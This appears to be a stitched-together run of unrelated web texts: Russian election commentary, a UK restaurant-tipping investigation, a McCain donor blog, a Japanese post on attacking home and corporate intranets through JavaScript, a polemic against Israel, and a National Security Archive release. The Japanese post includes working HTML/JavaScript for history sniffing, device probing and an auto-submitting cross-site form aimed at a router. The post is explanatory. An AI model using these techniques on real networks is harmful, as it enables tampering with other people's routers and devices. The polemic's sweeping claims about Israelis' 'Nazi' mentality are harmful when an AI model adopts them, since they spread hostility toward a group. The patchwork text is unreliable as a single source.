Nickel to oil and gas resources , these very wealthy individuals ­ Roman Abramovich , Oleg Deribaska , Michael Friedman still own the bulk of Russian assets and wealth .
Their writ does not run far beyond business matters , they can't interfere with the state politics .
However , Putin had a mandate to get rid of them all ; but he never did it .
More important , Edinaya Rossia ( ER , the ruling party ) has no coherent ideology or attitude .
A loose federation of regional blocks , its members want to be in power , they allegedly paid millions of dollars for a safe place on the party list ; and they can betray Putin as fast as anybody .
Yes , Putin led them to victory ­ over 60 % of vote , but what now ?
Does it imply they will continue to follow Putin 's course ?
We learned that Putin decided not to take a seat in the Parliament .
He is adamant in his refusal to run for presidency third term .
And the Duma ( Russian Parliament ) is anyway quite powerless according to the 1994 constitution .
So the immediate future is far from clear .
Even more important : reading Mike ( or reading Western media ) , you get an impression that ER competes for power with the liberals , that Putin is the alternative to pro-American and pro-Zionist SPS .
ER is opposed ( in the Parliament ) ­ not by Kasparov and liberals , but by Communists and Nationalists .
Liberals never succeeded to win any sizeable share of vote , while the Communists won the presidential elections in 1996 ­ and allowed the victory to be squandered as they were afraid of civil war and repetition of 1993 bloodbath .
Putin fought the Communists by means fair or foul : he blocked their access to TV , he tried to split them and organised a few parties to draw away the voters from the Communists .
After the elections , the splinter party leaders expressed desire to rejoin the mother party , CPRF .
The Western media promote worthless and unpopular liberals of Kasparov etc , who would not even be heard of in Russia otherwise .
Who cares what the view of Kasparov is ?
However , this fight against Kasparov and Yavlinsky is a troublesome sign .
I was in St Petersburg at the time of their demonstration ; the demo counted at best about two hundred participants of orderly behaviour , but the great city was awash with riot troops and armoured vehicles like Ramallah .
A friend of mine , a University teacher , who just passed by , was arrested ; and so were many other bystanders .
Why was it necessary ?
Is it usual Russian heavy - handedness , or something more sinister : an attempt to attach importance and promote the liberal opposition at the expense of the Communists ?
In conditions of perfect democracy , the Communists would soar to majority or plurality ­ they are quite patriotic , and they do approve of positive steps by president Putin .
But even in the present setup , the Communists have much to do : they can support the line associated with Putin and force the government to implement its declarations .
President Putin is a very good and successful manager , and he has made many valuable contributions to Russia 's well - being .
He needs some critical support from the left ; not an automatic yes - saying , in order to withstand the pressure from the right .
Small Print
There was much talk of irregularities in the elections .
The ruling party made full use of Putin 's name and reputation in its campaign .
Their huge posters linking ER and Putin were placed in every city and town of Russia .
But it was not worse than in Israel before 1977 , or indeed Sweden in the 60s , when the predominance of social democrats was nearly total .
As for counting , it appears that it was relatively fair , with exclusion of national republics at the Southern rim of Russia , where they went as far as they could to ensure their representatives ' place in the Parliament .
The Western complaints misfired , because the same bodies , who objected to irregularities , fully approved of the rigged elections of 1996 and even of shelling of the Parliament in 1993 .
Russians had lost their virgin beliefs in the western fairness .
It is interesting to compare successes of Putin who run a flawless election with errors of Chavez and his failed referendum on the same day - both against the US wishes .
While Chavez antagonized the church , Putin had the church on his side .
Chavez entered the campaigning while media was in the hands of his enemies ; Putin took over media and banks first .
Lenin spoke of taking over " banks , telegraph , railway stations " in case of revolution , nowadays TV has to be the first to go .
Putin , as opposed to Chavez , did not antagonise the Jews either .
Though he ships anti-aircraft weapons to Syria and meets with Hamas , the Rabbis still adore him and treasure a meeting with him much above that with president Bush .

Britain 's restaurants are creaming off millions of pounds of customers ' tips to boost their profits , an investigation by The Independent has found .
A series of legal ploys are being used by major companies including Strada , PizzaExpress and Carluccio's to take a slice of the £ 4bn a year that diners leave for low - paid staff in tips .
Today ,
The Independent launches a campaign to improve the treatment of the country 's 231,845 waiters and waitresses – and ensure that customers know where their money is going when they leave a tip .
Download the new Independent Premium app Sharing the full story , not just the headlines
Most restaurant customers believe staff receive the tips or service charge as a reward for good service .
But our investigation has discovered that tips left by diners are being regularly used to pay basic wages , or meet costs .
Among the practices , The Independent found :
* Carluccio's , Café Rouge , Chez Gerard , Strada and Café Uno all pay their staff less than the minimum wage and use customers ' tips to make up the balance in their employees ' pay ;
* PizzaExpress takes an 8 per cent cut of tips left on a credit card ;
* One chain of Asian restaurants , Georgetown , takes 100 per cent of tips ;
* Staff at one London eatery receive no basic wage at all .
Last night ,
The Independent 's campaign won the backing of MPs from all parties and the trade union Unite .
Stephen Byers , who introduced the national minimum wage when he was Trade and Industry Secretary , said : " Action is needed now to ensure fairness , so customers know when they leave a tip for good service , it goes to the individual concerned and is not an extra sum of money for the employer or restaurant owner .
" Loopholes in the system are being exploited by unscrupulous restaurant owners .
We must close the loopholes so hard - working staff get the rewards their customers want them to have . "
Peter Luff , Conservative chairman of the Business and Enterprise Select Committee , acknowledged there was " exploitation " of workers in the hospitality sector .
" Nobody should be paid anything less than the minimum wage .
They should not have to depend on charity to get a legal wage , " he said .
Sarah Teather , the Liberal Democrats ' spokeswoman on business and enterprise , added : " It 's great that The Independent is highlighting such an important issue and I wholeheartedly back the campaign . "

In 2006 , Britons spend £ 37.6 bn spent on food and drink in restaurants , according to the British Hospitality Association .
At 12 per cent , tips for waiting staff should approach £ 4.7 bn a year .
But restaurants are using several loopholes to take a portion of the money .
The practices are believed to have intensified with the rise of electronic payments and the introduction of the chip and pin system in 2006 .
Among the most popular is the exploitation of a loophole in minimum wage legislation .
Restaurants have won the right to pay staff below the minimum wage of £ 5.52 per hour for workers aged 22 years and older .
Staff are paid as little as £ 3 or £ 4 , with the remainder topped up by tips .
In a few cases , such as at Tuttons restaurant in Covent Garden , the staff receive no " pay " at all : their wages are derived entirely from tips left by diners .
Other waiters are forced to pay restaurant chains hundreds of millions of pounds in sales fees for " administering " tips .
Other establishments make deductions as a result of breakages or customers leaving without paying .
One waitress at a London restaurant complained : " Some of us work two jobs and you could be on your feet maybe 80 hours a week with no weekends .
If you 're earning £ 5 an hour and tips go to management , there is n't the incentive to give customers the best service . "
The Independent looked at the practices of 12 chains that operate 1,300 of Britain 's 26,600 restaurants and turn over almost £ 1bn a year .
They include some of the biggest names in the business .
Britain 's second biggest chain the Tragus Group , which runs Strada , Bella Italia , the French bistro chain Café Rouge and the Belgian beer and frites chain Belgo , also dips into tips to reach the minimum wage .
Paramount Restaurants also employs the practice at its Café Uno and Chez Gerrard brands .
At the Nobu Japanese restaurant in London , waiters claim they saw nothing of a £ 150 service charge on a £ 1,000 bill and an extra tip of £ 100 .
Gondola Holdings , Britain 's largest casual dining giant with annual sales of £ 228 m , deducts an 8 per cent administration charge from tips to staff at PizzaExpress .
A waiter at PizzaExpress , Nabil Guirguis , was allegedly dismissed for talking to the media about the practice , which the private equity company insists is fair .
The British Hospitality Association , which represents restaurants , denied that its members were mean – and blamed the Inland Revenue for failing to provide a clear lead .
Its deputy chief executive , Martin Couchman , said that there were " legitimate " costs involved in distributing service charges and credit card tips .
" It 's perfectly legal to top up to the minimum wage , " he said .
" Evidence from recent controversy is that , overall , people are earning more than the minimum wage .
It 's legal and its one of the things that arose from the Inland Revenue interpretation , which was very confused for a long period . "
Restaurateurs also maintain that their use of tips to top up , or replace , their wages incentivises staff .
" Our waiters get a salary depending on how good or bad they are , " said Kumar Muthalagappan , the founder and owner of Pearl Hotels and Restaurants Group .
Unite , however , believes that staff should receive all their tips .
Len McCluskey , Unite assistant general secretary , argued that low paid workers deserved a better deal on tips .
" The Government must take action so that everyone can tip with confidence , " he said .
" Customers want to know their tips are going to the hard - working staff who serve them . "
The Independent is urging restaurants to run an equitable and transparent policy on disbursements to staff – and to disclose that policy on menus .
We are also calling on the Government to end the minimum wage loophole , ensuring that staff are automatically paid the minimum wage in full .
Three simple steps for just deserts
Today ,
The Independent sets out three simple guidelines for fair treatment of waiting staff , asking that the Government introduces legislation to end the widespread unfair tipping practices adopted by many of Britain 's restaurants :
1 ) All restaurants should operate a fair , clear and transparent policy for distributing service charges and gratuities to its staff .
2 ) All restaurants should display their policy on service charges and gratuities clearly on all of the menus .
3 ) All waiting staff should be guaranteed a basic salary of at least the minimum wage , excluding gratuities .
McCain vs. Illegal Campaign Contributions
August 5 , 2008 by twitterpaters
by twit
This is special .
Done in by a 1993 Chevy Cavalier .
It sure smells illegal :
WASHINGTON — Alice Rocchio is an office manager at the New York headquarters of the Hess Corp. , drives a 1993 Chevy Cavalier and lives in an apartment in Queens , N.Y. , with her husband , Pasquale , an Amtrak foreman .
Despite what appears to be a middle - class lifestyle , the couple has written $ 61,600 in checks to John McCain ’s presidential campaign and the Republican National Committee , most of it within days of McCain ’s decision to endorse offshore oil drilling .
… The donations , first traced by Campaign Money Watch last week , were part of $ 1.2 million in oil industry contributions to McCain ’s Victory ‘ 08 Committee , 73 percent coming after McCain reversed his long - held opposition to offshore oil drilling .
update !
More special fun from the McCain campaign , starring Harry Sargeant III :
The 2008 presidential campaign , which could see each side spend close to $ 500 million , has heightened the importance of “ bundlers ” such as Sargeant , who not only write checks themselves but also recruit scores of other donors to give the legal limit of $ 2,300 .
Questions about such donor networks have repeatedly emerged as points of stress for the campaigns .
In January , Norman Hsu , a top Clinton bundler , was indicted in part on charges of circumventing legal giving limits by routing contributions though “ straw donors . ”
Earlier this week , McCain drew questions about more than $ 60,000 in donations that were made this year to the Republican National Committee and his campaign by an office manager with the Hess oil company and her husband , an Amtrak track foreman .
In that case , the couple said they used their own money .
Some of the most prolific givers in Sargeant ’s network live in modest homes in Southern California ’s Inland Empire .
Most had never given a political contribution before being contacted by Sargeant or his associates .
Most said they have never voiced much interest in politics .
And in several instances , they had never registered to vote .
And yet , records show , some families have ponied up as much as $ 18,400 for various candidates between December and March .
Both Sargeant and the donors were vague when asked to explain how Sargeant persuaded them to give away so much money .
Yes , it is that difficult to explain why regular people would support McCain .
update : via TPM , the LA TImes tries and fails miserably to explain how the folks driving the 1993 Chevy Cavalier managed to come up with such a generous contribution :
… records suggest that the Rocchios are not without resources .
The couple listed an address in Flushing , N.Y. , and also have an Arizona home .
update : TPM Election Central has more about the Rocchios , including that they appear to rent at their New York address :
Alice Rocchio , a Hess office manager , and her husband , Pasquale Rocchio , an Amtrak “ track foreman , ” rent a house in Flushing , Queens
and appear to have a mortgage on their Arizona property :
Real estate records show they purchased a North Carolina property in 2006 , and in 2007 took out a loan to buy another property in Scottsdale , Arizona .
The Rocchios sound like all the folks who speculated that the housing market would go nowhere but up and bought properties on loan because of it .
I wonder how that is working out for them .
update : more numbers from the NY Times blog The Caucus :
Publicly available information about the Rocchios offers a mixed picture of their socio-economic situation .
They appear to rent their home in Flushing , a working class community in Queens , although property records also show they purchased a condominium in Arizona last year for more than $ 560,000 and a home in North Carolina for $ 525,000 in 2006 .
Motor vehicle records show a 2003 Buick and 1993 Chevrolet registered in their names .
and of course , the automated message from the McCain campaign :
Brian Rogers , a spokesman for the McCain campaign , said officials have gone back and examined the donations from the Hess Corporation , including from the Rocchios , but found nothing untoward .
“ We went back and looked at , ” he said .
“ We followed the law .
If anything raises a flag , then we ’ll obviously look further into it .
But at this point , there ’s no indication that anything happened . ”
which is awfully sweet of them to say .
Especially since McClatchy reports this :
A former FEC official said that it ’s possible that the Rocchios had the means to make those hefty contributions — their first reported donations to a federal campaign .
But the official , who declined to be identified because of the sensitivity of the matter , said that their donations also could trigger a complaint or otherwise catch the eyes of the agency ’s enforcement staff , tasked to ensure that companies or wealthy individuals do n’t illegally circumvent contribution limits by using employees or other third parties as “ conduits ” for cash .
The staff might wish to determine whether the couple is too “ under - employed ” to be making donations that large , the official said .
The staff might also wish to take a look at the other “ unlikely donors ” that are being reported on …
update : The New York Times reports that the McCain campaign has returned $ 50,000 in donations :
The move follows the disclosure that the money was being raised by a Jordanian man who is a business partner of prominent Florida Republican Harry Sargeant III , who has collected hundreds of thousands of dollars for McCain .
The New York Times reported Thursday that Sargeant allowed a longtime business partner , Mustafa Abu Naba ’a , to bring in some $ 50,000 in donations in March from members of a single extended family in California , the Abdullahs , along with several of their friends .
[ …] According to the Times , Abu Naba ’a is a dual citizen of Jordan and the Dominican Republic .
It is illegal for foreigners to contribute their own money to U.S. political campaigns , and McCain ’s campaign said Abu Naba ’a did not do so .
But McCain spokesman Brian Rogers said some of the people solicited by Abu Naba ’a had no intention of supporting McCain for president .
Rogers said ” that just did n’t sound right to us ” so the money is being returned .
well , if “ just does n’t sound right ” is the standard the McCain campaign is using to decide whether to investigate its donors , how about this fun fact from the Caucus :
“ Mr. Rocchio is enrolled as a Democrat ”
that does n’t sound right …
Sen .
John McCain canceled the first day of his Republican National Convention , and his campaign made plans to turn the gathering into a giant fundraiser as they braced for the natural and political fallout from Hurricane Gustav , speeding toward the Gulf Coast .
Appearing by satellite from St. Louis , he told reporters in St. Paul , Minn. , ahead of the convention that " we have to do away with our party politics and act as Americans . "

JavaScriptを使ってイントラネット内を外から攻撃する方法
「 Hacking Intranet Websites from the Outside 」 という講 演 が2006 年にありました。 Black Hatでの講演です。
以下に説明する手法は既に公開されてある程度時間が経過している情報なので、ご存知の方にとっては既に古いとは思います。
詳細はプレゼン資料をご覧下さい。
概要
ファイアウォールなどに守られたイントラネットやホームネットワークの内部を攻撃する手法が解説してありました。
JavaScriptの基本仕様を組み合わせて情報を収集するというものでした。
最終的には、プリンタから印刷を行ったり、ルータの設定を変更するなどの攻撃が可能になるようです。 それ以外にも、Web経由で設定変更が出来るものは状況によっては影響されるかも知れません。
プレゼン後半で はCSRF ( XSRF , cross-site request forgery ) も解説されていましたが、この部分は今回は割愛させて頂きました。
機器検出方法１
手元のブラウザで訪問したことがあるURLを検出します。
例えば、その中にプライベートネットワークへのURLが存在している場合、マルウェアがそのURLで何らかのサービスが動作している事を知ることが出来ます。
192.168.X.Xなどの良く利用されているプライベートIPアドレス全般に対して、総当りで訪問履歴を調べていけば、家にあるSOHOルータの存在等を割り出せてしまう場合があります。
< html > < head > < style type =" text/css " > a { color : #0000 ff;} a:visited {color : ff0000 ;} </ style > </ head > < body > < a href= " http://192.168.6.9/ " id = " a " > a </a> < script type =" text / javascript " > var a = document.getElementById ( " a " ) ; var c ; if ( document.defaultView ) { c = document.defaultView.getComputedStyle(a,null).getPropertyValue(' color ' ) ; } else { c = a.currentStyle [ ' color ' ] ; } if ( c == " #0000 ff " || c == " rgb ( 0 , 0 , 255 ) " ) { document .write ( " 192.168.0.1 not visited " ) ; } else { document .
write ( " you visited 192.168.0.1 " ) ; } </ script > </ body > </html >
機器検出方法２
SCRIPTタグで外部スクリプト呼び出しの形をとって、イントラネット内に存在する機器を探せる場合もあります。
( 以下のサンプルスクリプトはFirefoxでしか動作せず。)
< html > < head > < script type =" text / javascript " > onerror = errfunc ; function errfunc ( msg , url ) { alert ( " my alert : " + msg + " : " + url ) ; } </script > </ head > < body > < script type =" text / javascript " src= " 192.168.255.255 " > </ body > </html >
機器検出方法３
IMG タグを使って機器の存在、及び機種の特定まで可能とプレゼン資料に記述してありました。
各ネットワーク機器に含まれる画像ファイル等のURLをフィンガープリントとして利用して、機器の特定を行うようです。
< html > < head > < script type =" text / javascript " > function found ( ) { alert ( " onerr " ) ; } function notfound ( ) { alert ( " onerr " ) ; } </script > </ head > < body > < img src= " http://10.9.0.1/easter.gif " onerror= " notfound ( ) " onload= " found ( ) " > </ body > </html >
攻撃方法
検出した機器情報を元に何らかの動作や設定変更が可能になる場合があります。
機器の種類まで検出できているのであればデフォルトのパスワード等を利用可能です。
プレゼン資料では、多くのCE機器がPOSTで動作しているものの、GETで同様のパラメータを渡しても動作するため、GETをPOSTに変更して攻撃が可能と書いていました。
パラメータの取得方法としては、CE機器ごとに生のHTTPメッセージを見て解析していっているようです。
ただ 、POSTも以下のような方法ドメインをまたいで送信可能だと思われるので注意が必要かも知れません。
< html > < head > < script type =" text / javascript " > function myfunc ( ) { document.getElementById( " f " ) .submit( ) ; } </script > </ head > < body onload= " myfunc ( ) " > < form method = " POST " action = " http://192.168.0.9/a.cgi " id = " f " > < input type =" hidden " name= " n " value= " val " > </ form > </ body > </html >
SOAP がドメインをまたいで出来ればUPnPなども影響されると思われますが、ざっと調べてみても今のところドメインをまたいでSOAPを使う方法を発見できませんでした。
( 探し方が下手なだけである可能性が高いのでご注意下さい。)
どうやって防ぐ か
基本的に、ブラウザのバグなどではなく仕様なので、ブラウザ側で対処するのは非常に難しいと思います。
2006年にこの手法が公開されてから、まだ根本的な対策がブラウザ側にされていなさそうに見えるのが、この手法回避の難しさを物語っていると思われます。
実際にこれらの手法を使って書かれたマルウェアを回避するには、JavaScriptを無効にするか、ブラウザとは別のセキュリティ対策ソフトで検出してブロックするぐらいしか方法が思いつきませんでした。
2006年に発表された手法なので、既に様々なマルウェアで広く使われているのではないかと多少怖くなった今日この頃です。

The lesbian mothers of IVF twin girls have lost a legal bid to sue their doctor for the cost of raising one of the toddlers .
The women , whose names have been suppressed , sued prominent Canberra obstetrician Sydney Robert Armellin for more than $ 400,000 for implanting two embryos instead of the requested one .
The ACT Supreme Court today ruled in favour of Dr Armellin , and ordered the couple pay his legal costs .
The IVF procedure , which used sperm from a Danish donor , resulted in the birth of twin girls , now aged four .
The couple , whose combined income is more than $ 100,000 , sought $ 398,000 from Dr Armellin to cover the costs of raising one of the girls , including fees for a private Steiner school in Melbourne .
Israel ’s collective psychosis :
The denial syndrome
By Khalid Amayreh

This week , Israel sank in an avalanche of national lethargy , hypocrisy and self - righteousness .
Seeking to cope with Hezbullah ’s success in getting Israel to release all Lebanese prisoners , dead and living , in exchange for the remains of two Israeli soldiers , Israeli leaders , media and shapers of public opinion have been indulging in sanctimonious self - glorification while denouncing the other side as “ hateful , uncivilized and representing an inferior culture . ”
This is a characteristic Israeli behavior .
It perfectly characterizes a society that has been living in a state of denial ever since Zionist gangs , aided by western powers , succeeded in uprooting the bulk of native Palestinians from Palestine , their ancestral homeland , and implanting therein Israel , a state based on racism , terror , ethnic cleansing and falsification of history .
The orgy of lying , especially the shocking amenability of most Zionist Jews to take the obscene lies at face value caricatures a people that dreads knowing the truth , let alone coping with it .
And when the truth eventually manages to penetrate the “ iron wall ” of Zionist lies , the custodians of the big lie , which is Zionism , resort to a whole set of defense mechanisms to protect the collective mental sanity of a state whose very existence constitutes a crime against humanity .
Thus , according to this depraved and psychotic mindset , Israel does n’t murder children and innocent civilians ,
It is only the victims that bring death upon themselves .
And Israelis do n’t steal the land and property of Palestinians , since the entire world was created for the sake of the “ chosen people . ”
And even when Jews do commit “ certain mistakes ” and “ abominable sins , ” they are not really to blame for that since it is the victims that always force Jews to make these mistakes .
Hence , the proverbial Palestinian victim of Israeli savagery is always responsible for the demolition of his own home , the murder of his own children and the destruction of his own farm , grove and orchard by Israeli bulldozer !!
Eventually , the entire Palestinian Nakba is a self - inflicted calamity which the Palestinians brought upon themselves because they refused to succumb to the will of the “ chosen people . ”
More to the point , if the Palestinians do n’t come to terms with the Nakba and the occupation , a greater Nakba , or holocaust , would be inflicted upon them .
Interestingly , the wave of self - righteous overindulgence in Israel has been led by the establishment people , figures that know too well that Israel does n’t really represent the culture of peace , but rather the culture of war and aggression ; they know that Israel is inculcated with a criminal and murderous mentality that differs very little from the Nazi mentality .
Yes , they do know all of this , but like all murderers , thieves and liars , they dread facing the truth .
The truth would simply make them lose their raison d’etre .
This is why they always try to turn the black into white , the white into black and the big lie into a “ truth ” glorified by millions of “ beneficiaries ” at home and ignorant “ fans ” abroad .
It may be particularly difficult to convince the “ beneficiaries ” of their sinfulness , namely the fact that they are living in homes that belong to other people and living on land that belongs to another people .
However , for the sake of the ignorant or naïve fans in Europe and north America as well as the rest of the world , it is imperative that they be delivered from the grip of Zionist lies .
Yes , westerners must be allowed to know the naked truth about this sick and sickening state that deceptively claims to be the sole true inheritor of Judaism while its ideology , behavior and actions are antithetical to all religious and moral values that stress universal justice and human equality .
Let us remember some of the “ glorious expressions ” of the Zionist culture of love and self - abnegation in recent years .
Chris Hedges is a prominent journalist and author specialized in American and Middle Eastern politics .
He worked for a number of publications including the Christian Science Monitor , the Dallas Morning News and the New York Times where he spent 15 years .
In his recent book , War is a Force that Gives Us Meaning , Hedges tells a chilling story from his trip to the Gaza Strip in the heydays of the intifada , or the second Palestinian uprising against the Israeli occupation .
Hedges watched , ten - and eleven - year - old Palestinian children being lured to their neighborhood ’s perimeter fence by taunts from a loudspeaker on the Israeli side .
“ Where are all the dogs of Khan Younis ?
Come !
Come !
The Israeli voice barked insults at the boys ’ mothers .
The boys responded by hurling their rocks at the jeep with the loudspeaker .
The Israelis shot at them with M - 16s fitted with silencers .
Hedges found the victims in the hospital , children with their stomachs ripped out , and with gaping holes in their limbs .
Writing for “ Harper ’s Magazine ” ( see The Nation , March 11 , 2002 ) , Hedges wrote : “ Children have been shot in other conflicts I have covered .
Death squads gunned them down in El Salvador and Guatemala , mothers with infants were lined up and massacred in Algeria , and Serb snipers put children in their sights in Sarajevo , but I have never before watched soldiers entice children like mice into a trap and murder them for sport . ”
Here is another “ expression of love : ” In November , 2001 , an undercover unit of the Israeli army buried a landmine in the sand that flows around Abdullah Siyam Primary School in Khan Younis in southern Gaza .
A few hours later , as Palestinian children headed to school , the mine exploded .
Five school kids were instantly reduced to broken flesh .
The youngest was six .
All the victims came from the same extended family : Akram Naim Astal , 6 , and his brother Mohammed , 13 ; Omar Idris Astal , 12 , and his brother Anis , 10 ; and their cousin Muhamemd Sultan Astal , 12 .
Their young bodies were mutilated beyond recognition .
The limbs of one child were found 50 meters away .
Some of the kids could only be identified by their school bags , brightly colored and spattered with blood , still dangling from their butchered bodies .
Hasbara doctors in Israel might seek to extenuate the gravity or even whitewash these crimes by claiming that these were “ individual acts ” that did n’t reflect the overall policy of the Israeli government and army .
However , this is a big lie .
In 2001 , the noted Israeli award - wining journalist Amira Hass interviewed an Israeli sniper in which the soldier described the commands he received from his superiors :
“ Twelve and up , you are allowed to shoot .
That is what they tell us , ” the soldier said .
“ So , ” responded the reporter , “ according to the IDF , the appropriate minimum age group at which to shoot is 12 . ”
The soldier replied : “ this is according to what the IDF says to its soldiers .
I do n’t know if this is what the IDF says to the media . ”
A further “ expression of love and humanity of Israeli culture ” manifested itself , also in Gaza , in 2004 , when an Israeli occupation army soldier , dubbed Captain - R , shot a Palestinian girl , Iman al Hums , who was on her way to school .
However , the soldier was not sure whether the 13 - year - girl died or not .
Hence , he walked to the bleeding child , and instead of trying to save her life , he shot here 25 times , emptying his entire magazine of bullets into her tender body .
He did what he did in order “ to verify the kill , ” a standard Israeli army practice in such circumstances
Now , the reader might be prompted to think that the bloodthirsty murderer was arrested and made to stand trial for his hair - raising crime .
Well , the opposite happened .
The soldier not only was innocent of any wrongdoing but was also awarded tens of thousands of dollars for being “ hurt and libeled by unfavorable media coverage . ”
In truth , it is not only Israeli army soldiers and officers who willfully indulge in such Nazi behavior .
Zionist rabbis routinely issue religious edicts that would allow Israeli troops to murder non-Jewish children knowingly and deliberately without having to worry about any ramifications , moral or otherwise .
In May 2007 , shortly before Israeli occupation soldiers murdered two Gaza children who apparently were searching for scrap metal to sell for a few cents in order help feed their impoverished families , the former Israeli Chief rabbi , Mordechai Elyahu , petitioned the Israeli government to carry out a series of carpet bombing of Gaza population centers .
Elyahu argued that a ground invasion of the world ’s most crowded spot would endanger Israeli soldiers .
He said “ If they do n’t stop after we kill 100 , then we must kill a thousand .
And if they do not stop after 1,000 , then we must kill 10,000 .
If they still do n’t stop we must kill 100,000 , even a million , whatever it takes to make them stop . ”
Earlier , Elyahu , a prominent Talmudic sage , called on the Israeli occupation army not to refrain from killing Palestinian children if that means saving the lives of Israeli soldiers .
The above - mentioned are only sporadic examples of the barbarian spirit inculcated in Israelis , especially soldiers dispatched to the occupied Palestinian territories to guard the occupation and enforce apartheid .
It is this barbarian mindset that makes Israeli soldiers abduct Palestinian school children and take them to nearby Jewish settlements where they are used as “ training objects ” by Jewish youngsters .
It is this barbarian mentality that makes Jewish soldiers force helpless Palestinian laborers do certain depraved acts such as drinking soldiers ’ urine and singing , individually or in unison , “ wahad Hommas , wahad fool , Allah Iyhay - yee Mishmar Gvul ” ( one ‘ dish ’ hummus , one broad beans , may Allah greet the Border Police ) !!!
There are of course thousands , even tens of thousands , of examples which one could easily and readily cite to underscore Israeli barbarianism .
To be sure , this disgraceful reality is known to many Israelis .
In 2001 , Shulamit Aloni , a former minister of education , wrote in the Israeli newspaper Ma’ariv that “ we have become a barbarian people . ”
So , what makes a leftist , liberal woman see in Israel what the vast bulk of Israelis , including the country ’s intelligentsia , would n’t see , or more correctly , would n’t want to see .
Well , it is Israel ’s collective psychosis , the denial syndrome ?
We love this idea from the Italian design group Paula .
Come home , take your clothes off , and throw them at the wall where they ’ll stay until the next time you need them .
Their words against him
The RNC puts out a compilation of clips from the long primary campaign of the two Clintons and John Edwards criticizing Obama 's experience and his readiness .
It strikes me that while these clips are n't great for Obama , you certainly can imagine worse :
The Clintons never said , flatly , " He 's not ready , " for instance .
It is ( yet another ) reason that the notion of a joint ticket seems so utterly remote .
Washington D.C. , August 20 , 2008 - On the tenth anniversary of U.S. cruise missile strikes against al - Qaeda in response to deadly terrorist attacks on U.S. embassies in Kenya and Tanzania , newly - declassified government documents posted today by the National Security Archive ( www.nsarchive.org) suggest the strikes not only failed to hurt Osama bin Laden but ultimately may have brought al - Qaeda and the Taliban closer politically and ideologically .
A 400 - page Sandia National Laboratories report on bin Laden , compiled in 1999 , includes a warning about political damage for the U.S. from bombing two impoverished states without regard for international agreement , since such action " mirror imag[ed ] aspects of al - Qaeda 's own attacks " [ see pp. 18 - 22 ] .
A State Department cable argues that although the August missile strikes were designed to provide the Taliban with overwhelming reason to surrender bin Laden , the military action may have sharpened Afghan animosity towards Washington and even strengthened the Taliban - al - Qaeda alliance .
Following the August 20 U.S. air attacks , Taliban spokesman Wakil Ahmed told U.S. Department of State officials " If Kandahar could have retaliated with similar strikes against Washington , it would have . "
Such an attack , although unfeasible at the time , was at least in part actualized by al - Qaeda on 9/11 .
Following the 1998 embassy bombings , the U.S. sought to extradite bin Laden to Saudi Arabia or possibly Egypt , but failed to get bin Laden out of Afghanistan because , at least according to the U.S. Department of State , Saudi Arabia and Pakistan were unable or unwilling to apply enough pressure to coerce Taliban Supreme Leader Mullah Omar to surrender bin Laden .
The lengthy Sandia report , compiled by Dr. Gary W. Richter and obtained by National Security Archive Middle East Analyst Joyce Battle , synthesizes an impressive volume of public - source information available on bin Laden into a coherent summary of the al - Qaeda terrorist threat following the August embassy bombings .
The report concludes that the bombings did not take U.S. intelligence and diplomatic services by surprise , as the U.S. in 1998 had capable counterterrorism intelligence gathering and interdiction capabilities .
However , according to the report , in retrospect , the August 20 retaliatory cruise missile strikes may have caused long - term political harm to U.S. national security and counterterrorism interests [ see pp. 18 - 22 ] .
The report contains extensive timelines , biographies and issue summaries and is useful for researchers interesting in the evolution of al - Qaeda and the American response .

Document 1 : Sandia National Laboratories , U.S. Department of Energy , Dr. Gary W. Richter , Osama bin Laden : A Case Study , December 6 , 1999 .
Relying entirely on open - source information such as news media reports , this extensive examination of the emerging al - Qaeda terrorist threat was compiled by Dr. Richter at Sandia National Laboratories in 1999 in response to the 1998 U.S. embassy bombings .
Due to Sandia 's affiliation with the Department of Energy , the report focuses on weapons of mass destruction , but provides a summary of the August 7 , 1998 , bombings , the August 20 , 1998 , U.S. retaliatory strikes , and the ambitions of al - Qaeda by 1999 .
Synthesizing a huge volume of background information into a coherent document , in this nearly 400 - page , pre-9/11 report , Dr. Richter produced several compelling and noteworthy findings , including :
The " war " against terrorism will never be " won , " as terrorism will always be a global problem .
The August 7 , 1998 , embassy bombings should not be taken as an indication that U.S. counterterrorism efforts are entirely ineffective .
The August 20 , 1998 , retaliatory cruise missile strikes did little to help solve the problem posed by bin Laden and may ultimately prove to have done more harm than good .
The risk of future attacks by Osama bin Laden or his associates using weapons of mass destruction ( WMDs ) is not insignificant .
The root cause of the militant threat is the widespread and deep - seated discontent among a large segment of the Islamic world , as opposed to the actions or agitation of any one individual or group of individuals .
As such , diplomatic options are likely to be the most effective strategies at reducing the threat .
In regards to the August 7 , 1998 , U.S. Embassy bombings , the Sandia report finds that " even though the embassy attacks make America look weak , the many success stories imply that the U.S. capability to combat terrorism is far from feeble . " [ page 20 ]
The U.S. was not " blindsided " by a new threat , as much was already known about al - Qaeda , including its anti-American aspirations and the existence of an East African al - Qaeda cell .
[ page 18 ]
Members of this East African cell had been identified before August 7 , and were under " intense scrutiny . "
It is likely " that this campaign of disruption had done much to dissipate the threat . " [ page 18 ]
In response to the ongoing surveillance , threat evaluation and disruption operations , the members of this cell " felt themselves to be at " 100 % danger . " [ page 18 ]
" In retrospect there were also specific indications of a bomb plot , " however " it seems as if threat assessment personnel in Washington did not take the warning signs as seriously as did the embassy personnel in Nairobi . " [ page 19 ]
The number of bombings prevented far exceeds the number of bombings that were not stopped by U.S. security efforts .
[ page 18 ]
In regards to the August 20 , 1998 , U.S. cruise missile strikes in Afghanistan and Sudan , the report finds there were several negative political consequences that may be ignored as time passes , including : High cost
International criticism
Questionable justice in that the strikes " killed only ( or nearly only ) individuals who were innocent of the embassy bombings "
Reputational damage from disregarding alliances
Questionable effectiveness in destroying or disrupting al - Qaeda or perspective terrorists
Possible diminished impact for any future U.S. strikes by " demonstrating how little [ the U.S ] could achieve ( e.g. , limited physical damage ) , " by depleting ammunition , providing adversaries with an opportunity to observe and reformulate strategies based on observed vulnerabilities , and convincing bin Laden that the U.S. is unwilling to use higher - cost forms of force that would put U.S. personnel at risk
" The attack provoked a new round of terrorist bombing plots . "
Bin Laden received a good deal of publicity and " appeared to many as an underdog standing firm in the face of bullying aggression . "
The Taliban 's poor control over Afghanistan " may mean that they should n't bear responsibility for the acts of those on their soil . "
The U.S. may have given away the moral high ground by mirroring certain aspects of bin Laden 's strategy with the attacks , and the U.S. bombed targets in independent third - world countries without concern for the sensitivities or sovereignty of those nations .
The advantages of the retaliatory strikes included : Justified under domestic law
Calling attention to the bin Laden - Taliban connection , which complicated the Taliban 's ability to gain international recognition as well as their future ability to justify support for Muslim fundamentalist groups
